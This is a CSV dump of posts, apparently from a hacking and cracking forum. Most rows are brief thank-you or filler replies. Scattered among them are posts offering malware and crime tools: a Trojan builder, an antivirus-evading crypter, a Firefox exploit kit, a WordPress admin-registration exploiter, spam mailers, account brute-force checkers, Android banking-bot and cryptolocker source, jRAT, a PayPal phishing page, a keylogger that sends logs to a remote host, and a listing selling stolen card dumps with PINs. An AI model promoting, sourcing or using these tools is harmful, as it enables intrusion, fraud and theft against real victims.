flatContent,authorName
"thanks a lot",codyalderton
"thank-you man",codyalderton
"Eskere eskere eskere",lavoe
"Maybe someone didn't know about this program. This is a very useful utility. which will make your bat Trojan - exe Features Extended commands Visible and invisible applications Executables with administrator priviliges Inclusion of additional files, folders, icon and version information Creation of 32-Bit and 64-Bit EXE files Commandline interface Portable Encryption Multilanguage support Free for commercial and non-commercial use https://mega.nz/#!R7hCHY6I!iaoA9JBOe...QZKKBf2LO9LEBc",zero911
"Get the latest privateloader releases. Just visit the url below and accept to receive notifications! Hacxx News For Google Chrome, Opera, Mozilla Firefox, Apple Safari and Windows Phone 8.0 only Note: You can opt-out at any time",tqosi
"thanks very much",aabee
"Thanks!! i really needed",gonz1928
thxxxxxxxxxxx,solocum
thxxxxxxxxxxxxxx,solocum
"thanx for this",solocum
"Thnx bro......",rzk90223
"thanks job for work",godzilla321
"thanks good",godzilla321
"is it is working",techgamer
dtdtdt,saeidarsham
"Thanks for tut",pypt
xxxxxxxxxxxxxx,fomiel
xxxxxxxxxxxxxxxxxxxxx,fomiel
fgbfgdrgdrgrd,alonelove7
"goooood job",godzilla
"wow this serems legit",st0rmm
"thnkn u mun ty",st0rmm
"thanks very much",dastruckyt
"Biggest Thanks",h00kw0rm
thanksssssssssssss,nightwolf999
"damn son just what I needed",crackingarenauser
"ezqzwmtue,i.ruP&_ÜOZptr.uiez,umtwnag",evilhex
ewgREHTAJRZSKTUDIZFOUTPZÜOUK,evilhex
"lets see hows works",germakyla
"thanks very",germakyla
"amazon brute/cheker gift https://mega.nz/#!prwECRZb!3HDQdFamF...Q-14V8XH3xzB0o",myers75
teşekkürler,kuki9999
"i want to try your program.. thank you ---------- edit... link expired.. so sad",cupzjayu
"thank you pal",kylemodz
"thanks alot",lee2876
"right on bro and u made fucking sick thanks for your hard work",spun76
"thanks my friend",spun76
"thanks for this share great stuff",spun76
"thanks a million brother",spun76
"amazing thx you",robertovic
Nice...........,mitak0518
"the capability to",uploaddnes22
"thanksthank you mate",spun76
"thanks brother",djani
"thank you very much",predator55
thankssssss,spitier
"Great ! You are the best",lskd
"Wow,nice dude!",lskd
"Thanks dude!",lskd
"Nice bro",lskd
"Thanks a lot",lskd
"MaxBulk Mailer Pro 8.4.5 FRO (SEND EMAIL) https://goo.gl/D2SKw2 SERIAL key https://goo.gl/kT4pmC",jhh
"Lazy_Combo_Maker. https://goo.gl/XWcnqm",jhh
"DevLeacher1.2 https://goo.gl/2BYJXH",jhh
"hi, got the best mailer ever few days ago. it hits all inboxes, even gmail. it supports yahoo, aol, hotmail. reason im giving you this for free, because i got it for free, so why not share with you? you will get results in few days, you will see. the easiest money in the world if you know how to properly use these kind of tools. ofcourse you need to have good letter. if you need good letter, pm me. this mailer is tested by me and other few guys. it works very well! how to use? 1- get hosting (where to upload this script) 2- upload mailer script by shell/cpanel 3- enter your mailer link (www.xxxx.com/ProMailer.php) 4- enter details, such as email, sender name, subject, letter (in html), mailist and hit send 5- wait for results! Have a nice spam! Link: https://uploadfiles.io/28le2 Enjoy!",pletent
"Hello guys, created new mailer few days ago wanted to sell it, but its not worth it for few bucks, so i decided to give to you for free! It is tested by me and a lot of other users. working without problems! Clean. Try by yourself and make a vouch on this topic! Have a nice spam! Link: Easy_Mailer Enjoy!",wasaimen
"100% working mailer to inbox. CLEAN!!! you have to try it by yourself. download: Mailer_inbox_2017 +rep thank me later.",amengino
"thank you verry nice",lindes11
"You do not have sufficient rights to see the hidden data contained here.",max77
sad0141,topper
Suprafiles.org,topper
Suprafiles.org,topper
"damn, thats realy nice bro, thanks",electrocircuit
"Hey Guys, Glad to be a new member within the community. I Usually kick things off with a few combo releases or a Private Custom config when joining a new community forum , But I've been swamped lately with other Activities. Best I can do is give You all this amazing checker I've been using for Amazon. Hardly hits any error/captchas compared to other tools around right now. This is NOT My tool, I just Use it (I Have Paid Version) IF you like the tool, Support the creator by buying. Free Download: Download Amazon Multi Checker v1.0.0.1.zip from Sendspace.com - send big files the easy way",electrocircuit
"thanks man",shadowice
"nice share.thank you",shadowice
"thanks you",lee2876
"many thanks!!",coke153
"thankssss a lot for this bro",shadow05
"This is a toolkit to generate Firefox exploits that works on Firefox from version 15.0 to version 23.0 on Windows. Note: You will need to obfuscate or encode the result generated in order to avoid or reduce antivirus detection. Also both *********s have the exploits in plain text therefore they may be detected. (Don't trust, check the source before using them) The purpose of both *********s is to offer to beginners a easy way to generate custom exploit code for this two vulnerabilities without requiring coding. (Just Copy/Paste or simple batch programming) Download: Firefox Exploit ********* Virus Analysis (6/56) https://virustotal.com/en/file/a8838...is/1501211198/",tqosi
"thanks a lot",conte_orlando
"thanks man",lyoko1991
"thanks man",lyoko1991
"thanks dude",xalphaking
"Email SPAM Prank is a tool to send a large amount of emails to any email in the world. A user just need to write the target email and hit enter. Instantly the target email will start receiving emails. The Public Version is limited and it's configured to send a maximum of 281 spam emails. The Private Version sends more than 10.000 emails, contact me for more information at privateloader@hotmail.com Download: Email SPAM Prank 3.8 (CMD Public Edition) Virus Analysis: https://virustotal.com/en/file/7aac4...is/1498660565/",tqosi
"thanks man",dlachi
"thanks so much for this aesome share bro",kr3ms
"WE ARE BACK WITH GOOD AND HIGH BALANCE WORLD WIDE DUMPS WITH PIN PRICE FOR ATM PLASTIC CARDS -Plastic Card with amount 3000=300(Dollar,Euro,Pound) -Plastic Card with amount 6000=500(Dollar,Euro,Pound) -Plastic Card with amount 9000=700(Dollar,Euro,Pound) -Plastic Card with amount 3000=300(Dollar,Euro,Pound) -Plastic Card with amount 20k-50k=support Shipping with FedEx,DHL,UPS or EMS.Shipping time from 1-2 days PRICE FOR DUMPS TRACK1/2 WITH PIN** -Dumps track1/2 with pin (US)=100$/1pcs -Dumps track1/2 with pin (UK)=130$/1pcs -Dumps track1/2 with pin (Canada)=120$/1pcs -Dumps track1/2 with pin (AU)=150$/1pcs -Dumps track1/2 with pin (Europe)=150$/1pcs -Dumps track1/2 with pin (China)=150$/1pcs PRICE FOR DUMPS TRACK 1/2 WITHOUT PIN** *Dumps USA**101,201 -**** Classic|Master Standard=60$/1pcs -****|Master|****|Discover(Gold Platinum)=65$/1pcs -(Business,Signature,Purchase,Cooperate,Word)=70$/1pcs *Dumps UK**101,201 -**** Classic|Master Standard=65$/1pcs -****|Master|****|Discover(Gold Platinum)=70$/1pcs -(Business,Signature,Purchase,Cooperate,Word)=80$/1pcs *Dumps CA+AU**101,201 -**** Classic|Master Standard=65$/1pcs -****|Master|****|Discover(Gold Platinum)=70$/1pcs -(Business,Signature,Purchase,Cooperate,Word)=80$/1pcs *Dumps EU+ASIAN**101,201 -**** Classic|Master Standard=70$/1pcs -****|Master|****|Discover(Gold Platinum)=80$/1pcs -(Business,Signature,Purchase,Cooperate,Word)=90$/1pcs *Dumps Other Countries**101,201 -**** Classic|Master Standard=70$/1pcs -****|Master|****|Discover(Gold Platinum)=80$/1pcs -(Business,Signature,Purchase,Cooperate,Word)=100$/1pcs HOW TO BUY AND ABOUT DEAL** -We will inspect all the cards your order and send it to you in mins via email after we receive payments -We offer just mixed and bulk offers for all new customers -We will replace **** of charge if card not good or dont working -Please no test ****,lets buy for test -We are serious business,looking for a long-term relationship For Bulk Purchases** Min Order Price(D+P)** 500$/5PCS Min Order Price(Dumps)**300$/5pcs ICQ**7447437 MAIL**mathewtracker26@gmail.com JABBER**hackseller@jabber.ru",mr
"thanks mage",mariuszfc20b
"hi bro thanks for",jamesomerta
"thanks alott",thelastjedi
"You do not have sufficient rights to see the hidden data contained here.",franklin
"Crypter Advanced Version Buenas a todos, después de un largo tiempo sin aportar nada, les presento lo que algunos quiza les suene es un software que protegerá sus archivos usando las formas más avanzadas de encriptación, la ofuscación, y la manipulación de código. Esto garantizará la máxima protección ante la posible ingeniería inversa y detección, por lo que es una opción perfecta para los desarrolladores que buscan la protección del software y la indetectabilidad. Los archivos protegidos no requieren dependencias Soporte EOF Métodos privados de encryptación Prioridad en actualizaciones privadas Prioridad en soporte via Email/Chat/RDP Mutex Comprimir con UPX Retrasar la ejecución. Persistencia Inicio con windows oculto [ Msconfig y Regedit ] Forzar a ser admin Anti-Botkill Indetectable ante 64 antivirus Retrasar obtener Admin Compatible con el 90% de los softwares. Métodos privados e encryptaciones avanzadas. Programar obtención de admin Deshabilitar UAC https://mega.nz/#!xPIQlRiS!jsEoUyqzH...TlDlb_HrCYhdSY",blau
thxxxxxxxxxxxxxxxxxxxxxxx,moody87
exslant,gogo4
"jhytl ;kuty;uty kl;uytuk",cazman405
thanks!!!!!!,rodnay
"thanks you",serdar179
"thanx for share",brutepas
"Thanks man.(;:",nisse
"thank you very much",kark
"thanks let me try",gamersigma
Graaaaaaaaaaaaacias.,wonderland05
"lets try iiiiiiiiiiiit",gamer
"thanks for this share",zandoo21
"thanks thanks",azizi
"» Hi » Im sell my android bots pack » It contains sources(admin panel+apk): » -Skunk android bot » -GMCryptolocker » -GMloader » -KNL/Marcher Jabber poroh228@exploit.im",simon__smith88
"thank you for sharing",vivekp983
"wow ok looks great thx",icyspike777
thanksssssss,blade2386
"Instructions: 1) Stop the application if started 2) Install application using provided installer and do not reboot 3) Disable internet connection 4) Use one of serials provided 5) block the connection with a firewall C:\Windows\System32\drivers\etc\***** file: 127.0.0.1 license.piriform.com DONE! https://www.virustotal.com/nl/file/f...is/5485484164/ DOWNLOAD: You do not have sufficient rights to see the hidden data contained here.",sataq
"Thank you man",mrtunne
"Thank you. Much appreciated.",mikeyburg
"inbox mailer Guaranteed gmail inbox in working great just upload zip file to your cpanel , extraxt and start spamming. have a lot of spamming fun cheap and fast Zippyshare.com - inbox.zip",jmd11571
"thank youuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu",aymanoben
"you rock thanks",brandonrz
"i ll have a peek. thanks",esciidisko
"i ll have a peek. thanks",esciidisko
"thnxxxx bro",bpnrockstar
"nive tnkxxxxxxxxx",desmond
"Nice work. Thanks",sashok31
"Quote: Originally Posted by @Echo uw8ecR Droidsqli Android SQL injection Tool Salam To every One Some Time We bored and want to pick your phone and to to do some but hacker never let their work on mobile also as you guys know that Back Track is also available on Andriod But today i got some thing new For Hackers AS we know70% website hacked by using SQL injection. For automate SQL injection We need tool or OS - back track, havij or Kali, and etc..But now you can attack on site using your android mobile phone What You Need? 1 - SQL Vulnerable site 2 - android mobile (must) 3 - Droidsqli tool (Must) Download Link *** hidden content *** If this is your first time to read about this tool then comment Thanks nd Enjoy [*] Nice work. Thanks",sashok31
"thx bro!!!",sers
ggggreeeeaaatt,johnzy
"Quote: Originally Posted by bullshit69 The Vilan v4.9.1 Website and Email Hacker Pro in an application that lets you hack any email account, accounts on websites, own websites, servers games, finally, hack everything that can be accessed by username and password ... . The Vilan v4.9.1 Website and Email Hacker PRO seems complicated to use, but in a few days as summer after all with a little dedication will already have impressive results ... I am not responsible for the misuse of the tool, and advise them to use with any sense .... scan report : reFUD.me - Results Download link here : *** hidden content *** Ok. Please more soon!",johnzy
"Ok trying it. Thanks",securex
"Will check it. Thanks",securex
Thnx................,aak
thankssssssssssssssssssssssssssssss,laxemsworkru
nice........................,tfollowers1
"cool bro thanksssssss",georgdimitrov
"thanks fo sharing",chaler2010
"yes new proxy",gagas96
"this what i need",gagas96
"hey thanks man",jennamarble
"Quote: Originally Posted by bullshit69 The Vilan v4.9.1 Website and Email Hacker Pro in an application that lets you hack any email account, accounts on websites, own websites, servers games, finally, hack everything that can be accessed by username and password ... . The Vilan v4.9.1 Website and Email Hacker PRO seems complicated to use, but in a few days as summer after all with a little dedication will already have impressive results ... I am not responsible for the misuse of the tool, and advise them to use with any sense .... scan report : reFUD.me - Results Download link here : *** hidden content *** merci beaucoup pour ton boulot",motus900
"nice share bro.",daddy2002
"thanks dude so great",naviddada
"thanks man",york92
"Thanks man",york92
"tank you bro",b
"yhanks mate",jmd11571
"Thanks Dude",selanikbeyi
"tns for sharing",selanikbeyi
"thank youuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu",esen
"thank youuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu",esen
"thank youuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu",esen
"thank youuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu",esen
"thank youuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu",esen
"nice to share gut",elios
"very gooddd",lomi
"thank you very much",night_walker
"thanks for the hard work",raisintoast
"thanks for this share!",raisintoast
"nice tool..........",richard0909
thanks,desmond
fdhuishfdiuhuhsiufhf,coreycool12
hgfjgfdshmjgfdgh,coreycool12
"thank you very much",sainisunil
"thanks so much",madebylizzard
"thank you man",meysam2001
"thanks man nice post",mori23
"tanks man for this",piticu81
"tanks man for this",piticu81
"awesome mateeeee",ghosthenry
thxxxxxxxxxxx,p4n1c0zin
Thanks...!!!,tfollowers1
"thank you mcch",cazman405
"thx ya man",skyhack
"thx ya man",skyhack
thanksssssssssssss,jsantillana
"thank you dude",crotixhd
"thx man!!!!!",themothafuckaa
"Thanks for the post man",soliter01
00000000000000000000000000,ebeliejinfren
Bhjjknnnkk,karma562
"thaank you",r2dt
"thank you very much",freemason
"thanks for sharing",bossrive
1234567890-,catalint
"thanks very much",catalint
"thankssssss :sSig_go odjob:",catalint
"thank you man",jzzunl
"hi brother i need to instagram creator account",khaled
"[/CENTER] Virus Link:- https://www.metascan-online.com/#!/r...1d2aa2/regular Tut Link :-https://www.youtube.com/watch?v=kcYPOoyXNs8 Download Link:- You do not have sufficient rights to see the hidden data contained here. [CENTER]",mr
niceeeeeeeeeeeeeeeeeeeee,amin0910
"tanx very much",amin0910
niceeeeeeeeeeeeeeeeee,amin0910
tnxxxxxxxxxxxxxxxxxxx,amin0910
niceeeeeeeeeeeeeeee,amin0910
tnxxxxxxxxxxxxxxxxxxxx,amin0910
"thank you sir",ovan27
"thanks man",jzzunl
"mate i really needed 1 like this, thanks!",radule97
niceeeeeeeeeeeeeeeeeeeeee,ic3
"thanks bro!",l30nh8a
"thnaks man for the effort",newmanager84
"Hello Mates, I found this method by contacting this guy on this forum, I thought I might share this. What it does is basicly you register one account and use the discribed technique for good income & free money on bitcoins, no user interaction needed. Checkout here : You are being redirected...",warlock23
"thanks for this",rangerover143
"thanks for this",rangerover143
"thanks for this",rangerover143
"thannks or this",rangerover143
"thanks for this",rangerover143
"thanks for this",rangerover143
"thanks for sharing",ivey
"Paypal scam page 2015+letter Paypal scam page 2015+letter========== for more help contact me yahoo:kbksrb@ymail.com skype:kbksrb Code: http://pastebin.com/mWsZVLRV",bilalkhanicom
"thanks man awesome",grannypanties
"nice share bro.",dfre
"thanxxx bro...",safanic035
"Appreciate the work",solid_freak
"thank you!!!!",pepe2004545
"thanks mate!!",idfirel
"Quote: Originally Posted by wwexy *** hidden content *** Amazon AOL Blogger Ebay Blogfa Fb Nimbuzz Gmail Mihanblog MySpace Paypal Persianblog Twitter WordPress MihanHost ok yes",amir213
thankssssss,lomi
"thanks dude",johnluke12
tnxxxxxxxxxxxxxxxxxx,akoo
"Quote: Originally Posted by bullshit69 The Vilan v4.9.1 Website and Email Hacker Pro in an application that lets you hack any email account, accounts on websites, own websites, servers games, finally, hack everything that can be accessed by username and password ... . The Vilan v4.9.1 Website and Email Hacker PRO seems complicated to use, but in a few days as summer after all with a little dedication will already have impressive results ... I am not responsible for the misuse of the tool, and advise them to use with any sense .... scan report : reFUD.me - Results Download link here : *** hidden content *** is there any tutorial",gerena13
"thanks a bunch man!",xeno004
"thanks very much",solid_freak
"thx bro its awsome",solid_freak
"tns for sharing",kizza
"The Vilan v4.9.1 Website and Email Hacker Pro in an application that lets you hack any email account, accounts on websites, own websites, servers games, finally, hack everything that can be accessed by username and password ... . The Vilan v4.9.1 Website and Email Hacker PRO seems complicated to use, but in a few days as summer after all with a little dedication will already have impressive results ... I am not responsible for the misuse of the tool, and advise them to use with any sense .... scan report : reFUD.me - Results Download link here : You do not have sufficient rights to see the hidden data contained here.",bullshit69
"nice mate cheers",ruckus
thanxxxxxxx,rocklover
thankssssss,hunny031
"yep yep thanks",mick
"Appreciate the work",rawkid
"Little application and tut to find vulnerabilities on a blog hosted with wordpress : You do not have sufficient rights to see the hidden data contained here.",dwjeo
thnkkkkssss,istanbul34
"Good, Thank you",saqeer
"OWASP Zed Attack Proxy is the best tool for search and find vulnerabilities on web site ... you can do passive/active scanning ... fuzzing for vulnerabilities etc ... If you don't know this tool it is time to use it ! Some links to help you with it : You do not have sufficient rights to see the hidden data contained here.",dwjeo
"thanks man",ahmedthabt
thanksssssssssss,ahmedthabt
"thanks a lot",adm
"that's good",plab
thanxxxxxxxxxxxxxxxxxxxxxxxxx,wdk33
"thank you",xteaz
"thanks but where is the download link",denisben
"thanks very much",westy27
thhhxxxxxxxxxxxxxxxxxxx,toastaxx
thxxxxxxxxxxxxxxxxxxxxxxxx,wances
thanksssssss,needalover614
"nice share bro",denisben
"thanks a lot",rand1
"thanks a lot",rand1
dfsddddddddddddddddddddddddddd,32688036
11111111111112222222,wances
"thank youuuu DDD",mamba11
"thank youuu DDDD",mamba11
"that's good",farazprint812
"gooood code thanks",aswin
44444444444445555555555,wances
231111111111111111111111111,asdpro123
"nice share man",avatar
"nice share bro.",greek
"thx brother",abdomohamed
g8ydhsguh90fd,berazeteguenze4261
"thanks alot man",ludak96
"thanks alot",antonio2006
"nice share bro. tnx",tigerwow
"thanks mate",rast22
"thabks a lot dude",lindes11
"thanks dude",pepapepa
"thank you man !",ludak96
"Спасибо брат!",goshag
"thanxxx bro...",billy114
thanksssssssssss,ammar
"thanxxx bro...",arifbillah24
thxxxxxxxxx,itsrian
TooL,kuriza
"Thanks Dude thats nice",kuriza
"Thanks Dude thats nice",kuriza
hhhhhhhhhhhhhhhhhhhhh,forkmr
"awhh yeah boiiiii",mrmudweasel
"Quote: Originally Posted by _CrackeR_ Tested 100 % new version Download Link *** hidden content ***",mohammadteghi
"that's good",majid
kkkkkkkkkkkkk.,ali6611555
"thanks mann",recl
"thanks mann",kakilagi77
"Nice work. Thanks",indounderground
"Thanks op. i want to see",buggednot
"damn fdsgsdg",gohui8935hnf
tnxxxxxxxxxxxx,hamidkhan22
"thanks very much",westy27
"thanks very much",westy27
"thanks very much",westy27
"Coded in C++ . Oh and you can scan the files on virustotal or anywhere.They are clean. Virus Scan:- (Expect false positive) https://www.virustotal.com/en/file/b...is/1412859638/ Anubis scan:- Anubis - Analysis Report You do not have sufficient rights to see the hidden data contained here. Creditz : Madleets",_2540echo_257Fuw8ecr
"Download : You do not have sufficient rights to see the hidden data contained here. Virus scan : RazorScanner - Scan Result Creditz to : 3v!L & Madleet",_2540echo_257Fuw8ecr
"Wordpress 0day Exploiter is a tool that allows you to register as a new administrator on WordPress sites that have an error in the file ajax.php. (authorization file hranilesche user data Instructions for use zero-day vulnerabilities Online Wordpress: 1. In the URL field, paste the link of the site and in the field, write the name of the theme topics, and in a field You mail prescribes ; soap; 2. Confirm Exploit ; 3. If the site is vulnerable, then T "Register" button will be enabled; 4. Click on the Register and the web browser will take you to the registration page; 5. Enter the user name and e-mail address 6. Check your inbox for confirmation and the password of your account. 7. If you selected a site on Wordpress is vulnerable and you have done all the above steps correctly then you have successfully registered on this site on the rights of the administrator; Virus Scan : https://www.virustotal.com/ru/file/a...is/1414082018/ You do not have sufficient rights to see the hidden data contained here. For your safety Scan yourself too and run in sandbox ; Creditz to Madleeet!",_2540echo_257Fuw8ecr
"Download : You do not have sufficient rights to see the hidden data contained here. Virus Scan : https://www.virustotal.com/ar/file/2...is/1416995419/ Creditz Goes To : MadLeets & SpyneTTn!",_2540echo_257Fuw8ecr
"thank you for the free vps bro.",el3aaidy
"thank you for the free vps bro.",sollaris
"good job thank you",noe
"nice share bro. tnx",david9965
"Tested 100 % new version Download Link You do not have sufficient rights to see the hidden data contained here.",_cracker_
"thanks very much",pjnlsn
tnxxxxxxxxxx,hamidkhan22
"what's this about?",romeoshine
"Quality Upload by .:sHaRe:. Please say "THANKS" to support me ! WORKING & TESTED on Windows 8.1, Windows Se7en, Windows XP. Internet Download Manager [IDM] v6.21 Build 14 - Final - Multilingual - Full  Incl. Cracked by Ghost0507 / REiS Released: October 15, 201 Quote: Internet Download Manager (IDM) is a tool to increase download speeds by up to 5 times, resume and schedule downloads. Comprehensive error recovery and resume capability will restart broken or interrupted downloads due to lost connections, network problems, computer shutdowns, or unexpected power outages. Simple graphic user interface makes IDM user friendly and easy to use.Internet Download Manager has a smart download logic accelerator that features intelligent dynamic file segmentation and safe multipart downloading technology to accelerate your downloads. Unlike other download managers and accelerators Internet Download Manager segments downloaded files dynamically during download process and reuses available connections without additional connect and login stages to achieve best acceleration performance. Internet Download Manager supports proxy servers, ftp and http protocols, firewalls, redirects, cookies, authorization, MP3 audio and MPEG video content processing. IDM integrates seamlessly into Microsoft Internet Explorer, Netscape, MSN Explorer, AOL, Opera, Mozilla, Mozilla Firefox, Mozilla Firebird, Avant Browser, MyIE2, and all other popular browsers to automatically handle your downloads. You can also drag and drop files, or use Internet Download Manager from command line. Internet Download Manager can dial your modem at the set time, download the files you want, then hang up or even shut down your computer when it's done. Other features include multilingual support, zip preview, download categories, scheduler pro, sounds on different events, HTTPS support, queue processor, html help and tutorial, enhanced virus protection on download completion, progressive downloading with quotas (useful for connections that use some kind of fair access policy or FAP like Direcway, Direct PC, Hughes, etc.), built-in download accelerator, and many others. Version 6.15 adds Windows 8 compatibility, adds IDM download panel for web-players that can be used to download flash videos from sites like YouTube, MySpaceTV, and Google Videos. It also features complete Windows 7 and Vista support, YouTube grabber, redeveloped scheduler, and MMS protocol support. The new version also adds improved integration for IE 10 and IE based browsers, redesigned and enhanced download engine, the unique advanced integration into all latest browsers, improved toolbar, and a wealth of other improvements and new features. Main Features:  Internet Download Manager supports all popular browsers including IE, AOL, MSN, Opera, Firefox, Avant Browser, and it can be integrated into any Internet application to take over downloads using unique 'Advanced Browser Integration' feature.  Dynamic Segmentation and Performance.  Easy downloading with one click. When you click on a download link in a browser, IDM will take over the download and accelerate it. IDM supports HTTP, FTP, HTTPS and MMS protocols.  Download Speed Acceleration. IDM can accelerate downloads by up to 5 times due to its intelligent dynamic file segmentation technology.  Download Resume. IDM will resume unfinished download from the place where they left off.  YouTube grabber. IDM can grab FLV videos from popular sites like YouTube, MySpaceTV, and Google Video.  Drag and Drop. You may simply drag and drop links to IDM, and drag and drop downloaded files out of Internet Download Manager.  Automatic Antivirus checking. Antivirus checking makes your downloads free from viruses and trojans.  Advanced Browser Integration. When enabled, the feature can be used to catch any download from any application.  Built-in Scheduler. IDM can connect to the Internet at a set time, download the files you want, disconnect, or shut down your computer when it's done.  IDM includes web site spider and grabber. IDM downloads all required files that are specified with filters from web sites, for example all pictures from a web site, or subsets of web sites, or complete web sites for offline browsing. It's possible to schedule multiple grabber projects to run them once at a specified time, stop them at a specified time, or run periodically to synchronize changes.  IDM supports many types of proxy servers. For example, IDM works with Microsoft ISA, and FTP proxy servers.  IDM supports main authentication protocols: Basic, Negotiate, NTLM, and Keberos. Thus IDM can access many Internet and proxy servers using login name and password.  Download All feature. IDM can add all downloads linked to the current page. It's easy to download multiple files with this feature.  Download Categories. IDM can be used to organize downloads automatically using defined download categories.  Download limits. Progressive downloading with quotas feature. The feature is useful for connections that use some kind of fair access policy (or FAP) like Direcway, Direct PC, Hughes, etc.  IDM is multilingual. What's new in version 6.21 Build 14 (Released: Oct 15, 2014)  Added support for Firefox 35  Improved Google Chrome integration module  Fixed bugs Download link http://rg.to/file/38...80/idm.rar.html",crackingofme
"thanks alot",zombis667
"Thank's for sharing",net375
"thanks for good share .",tarja
"awesome dude thanks",jennrob
"I've been working on a Windows based Python keylogger for the past days, and I thought I would share the code here. Although it's usable in its current form, I intend to come back to it at some point, after I get more familiar with the intricacies of Windows programming, and add some features that I didn't have the knowledge (and time, and patience) to implement right away, along with improving what could be improved in its current version. Overview of what it does: When started, it hides itself in the ADS of a file and saves the log in another ADS. It checks if the current user has Administrator privileges, and if it does, it adds a registry entry for all users to run at startup, unless it's been already added. If user isn't an admin, it adds registry entry for the current user only. When it exits, it sends the log to a remote host via sockets and deletes the local log. You do not have sufficient rights to see the hidden data contained here. I tested it on Windows 7 32 bit with UAC disabled. Also, I tested the individual components for both admin and normal user, but the final version only as admin user because of the following: - I wasn't able to find a location that would be accessible by all users, regardless of privilege, so I tested it with different file ***** for admin and normal user. So, even if the keylogger was added at startup for all users, its path wouldn't exist for non-admins - I had to find a location for hiding that would ensure the script would run at startup. Initially I hid it in C: , and it would work if called directly, but when called from the startup entry, it wouldn't write the log file (although it still grabbed the keystrokes) This was the first time I wrote something specifically for Windows and it was awful. For every small step forward there were like 10 complications popping up. Some things didn't work for no apparent reason, so I had to resort to trial and error. That number of Windows restarts.. If you don't want to see the Python console, it can be saved as .pyw and ran with no console output. It can also be packaged as an exe, but it will be necessary to modify some of the source code. I can't say how portable it is between versions of Windows, especially the registry editing part might not work on 64 bit. I only tested it on one version, because there is a limit to how many virtual machines one can have, and I can't delete any of my other ones to make space for a new one. If anyone wants to play with it, it might be better to comment out the hiding and ADS parts and save the log normally to be able to check that everything works instead of fumbling for ADS's. The most efficient way I found for testing was to comment out the hiding and send log parts for the initial tests. Maybe it would have looked more organized with OOP, but when I started it, I only expected to write the keylogging part and some log sending functionality, when I got ideas for the rest I added those too and it grew a bit outside the initially expected proportions.",loading
mmmmmmmmmmmmmmmmmmmmm,mxbxbx
"thanks for sharing",wearehidden
"thanks for sharing",wearehidden
"o not have sufficient rights to see the hidden data contained h",valagaska
aaaaaaaaaaaaaaaaaaaaaaaaaaa,killerman
"Account Suspended !",loading
"tgank yuo...",professionaltools75
"thanks bro..",loading
thanks............,swungchris
thxxxxxxxxxxxxxxxxxxxxx,gyuppi
"posting to see a content. not available anymore.",ruvip
"thank you for it",wackysession
thanksssssss,secrettoy
"cheeeeeeeeeeeeeers mate!",monako911
"thanks mate",iamnew
"Nice one....................",rajag
thankssssss,gameangel
"thnx man nice job",savagerex
"thanks very much",nitty
tnxxxxxxxx,piwo
"plz update the link",haiderali
"good work bro",haiderali
"leach leach, ready to leach",holykebab
"Thank you very much",supersonic
"thanx bro for the useful tool ..nice to share with us",gsundeep
"thanks very much",westy27
woohoooooooo,5n0wn1nja
"thank u bro hope is all going good",locouseking69
"nice share mate",indounderground
"nice share mate",indounderground
"Let's hope this works, been in minor need of one of these",5n0wn1nja
"thanksss ery much",nikola1337
"I'm trying to get some new or better bots/tools, kinda curious if this one works... thanks!!",5n0wn1nja
"A thousand pargels master.. I wish to thank you for this!!",5n0wn1nja
"thanxx brother",huseinn
"Found this on my HDD i know its a paid program so if anyone has use for this hope it helps someone out Download Jrat - 3.2.2.rar from Sendspace.com - send big files the easy way",jxshy
tengkyuuuuu,pangeranjogja
"Let Me Check Thanks",maya_
"im checking it now",chowderrunnah
thx...................,freddykruegers
"thanks bro",ksanf
thanks,jounin
"thank you veyr much",shumdit
"Mucha gracias..........",yesero69
"nice work man keep it up",multicracker
"how to use : this tool very easy just copy your hash paste text box and enter now you chose pass.txt last click brute button.... CRACKING ARENA 1st Scan report: Code: https://www.virustotal.com/en/file/1725dfeb77d16a69affe79212adeaec28764329e62e53c397e501013b515d8c0/analysis/1396676326/ DOWNLOAD : You do not have sufficient rights to see the hidden data contained here.",reptile
"yhanks man !",skizz
juer4234:pa230227,anurag899599
"thanks Neo",sag24
"nice share man",jinji
"thank youuuuu",isimwar
"Thanks so much for this",fxc123
"thanxxx bro",magicm00n
"thanks for this",stardust140
"Hey guys, Today i have found a free VPS host. I will give you the link and the instructions how to use. Step 1. Register Here: FreeVPS [size=x-small]( Loading can be during a while )[/size] Step 2. Activate your account by the email you have received. Step 3. After logged-in and your account is valid you need to press the 'gear'. [size=x-small]( The icon on the right side )[/size]",joey97mq
"thnks !!!!!!!",feralmeida
thnnnnnnnnnnnnnnnnnnnnnnx,alriah
"thanxxx bro",jaspalpunjabi
"You do not have sufficient rights to see the hidden data contained here. Amazon AOL Blogger Ebay Blogfa Fb Nimbuzz Gmail Mihanblog MySpace Paypal Persianblog Twitter WordPress MihanHost",wwexy
"Thanks man.",yoga
"Thanks a lot!",chipsfrisch14
"thank you, tnx a lot",lolmedia
"From here How To cheat adfly Autocliker New Method 2014 - YouTube",adema02
111111111111111111,jak0111
"thanks ill check it out",tommyp86
"thank you..........",starznitez
"thanks man",starznitez
thankssthankss,babalu
thanksthanks,babalu
"Quote: Originally Posted by NeoInvasor *** hidden content *** Nyc one Let's see",buggy
"Quote: Originally Posted by Errorx0void *** hidden content *** thanks you...",radisa26
"I really was looking for it thanks",subwayroot
thnxxxxxxxxxxxxxxxxxxxxxxxxxxxx,bilalquryshi
"Vlw mano sempre representando kkkk",hannibal_br
"Nice work.",hannibal_br
"nice man!!",satoorn
"test mannnnn........",tukang_kabel
"thanks boz..",mahanathan
"hey hey................",zeev666
"thanks men !",ludak96
"let see what's in it",frmmain
"thank you very good",c0de
"gracias capo",c0de
"thank you HEHE",topdos
"bro thanks",bullshit69
"thank you very good",bullshit69
"thanks for sharing",bullshit69
thanxxxxxxxxxx,bullshit69
goooooooooooooood,bullshit69
"Egyptian Shell SQLi Scanner [ Bing ] I'm new here, this is the new snanner and I still have many tools",bullshit69
"Quote: Originally Posted by NeoInvasor *** hidden content *** thank you very good",orestas1
"You do not have sufficient rights to see the hidden data contained here.",neoinvasor
"thank you sir",scouse
"thanks man",shack
"thx for sharing",lonely
"hi bro thanks for contribution in here......welcome NEO bro old hacker",reptile
"You do not have sufficient rights to see the hidden data contained here.",neoinvasor
thnx..............,buggy
"thank you kindly",westy27
"thanks for sharing",mimhaydar
"thanks you",rale26
"Thank you very much!",4815b
"Thanks............................................ ......",blackdevilcro
"tysm for this",scouse
